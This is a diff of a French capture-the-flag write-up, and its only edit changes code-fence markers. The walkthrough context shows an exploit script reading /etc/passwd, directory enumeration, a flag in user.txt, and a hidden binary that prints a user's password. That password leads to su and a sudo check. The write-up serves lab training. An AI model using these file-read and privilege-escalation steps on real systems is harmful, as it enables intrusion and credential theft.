@@ -104,7 +104,7 @@ On utilisera un serveur web quelconque (*python3 -m http.server* fait parfaiteme
 
 On peut par exemple récupérer le fichier */etc/passwd*.  
 
-```plain
+```
 $ python3 exploit.py /etc/passwd
 Sorry, root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -140,7 +140,7 @@ On peut voir deux utilisateurs sur le système : *dark* et *lord*.
 
 J'ai tenté de récupérer les clés privées SSH de ces utilisateurs mais soit le fichier n'est pas présent, soit les permissions ne permettent pas d'y accéder... Il est temps de fouiller un peu plus sur ce serveur web.  
 
-```plain
+```
 /img (Status: 301)
 /js (Status: 301)
 /backup (Status: 301)
@@ -156,7 +156,7 @@ G0t r00t
 
 On trouve dans le home de l'utilisateur le premier flag ainsi qu'une clé dont on ignore le but :  
 
-```plain
+```
 lord@dark:~$ cat user.txt
 d38f--- snip ---d422
 
@@ -166,13 +166,13 @@ jdhauioh38qhdu
 
 Toutefois en cherchant les fichiers de l'utilisateur *lord* (avec *find / -type f -user lord -not -path '/proc/\*' 2> /dev/null*) on trouve un binaire à un emplacement incongru :  
 
-```plain
+```
 -rwx--x--x 1 lord lord 8664 Oct  6 12:16 /var/tmp/locker
 ```
 
 Donnons lui ce qu'il demande :  
 
-```plain
+```
 lord@dark:~$ /var/tmp/locker
 Usage: <key>
 lord@dark:~$ /var/tmp/locker jdhauioh38qhdu
@@ -182,7 +182,7 @@ dark password = supereasypassword101if
 
 Grace à ce mot de passe on peux devenir *dark* via *su*. Cet utilisateur fait partie du groupe *sudo*, voyons voir ce que l'on peut faire :  
 
-```plain
+```
 dark@dark:~$ sudo -l
 [sudo] password for dark:
 Matching Defaults entries for dark on dark:
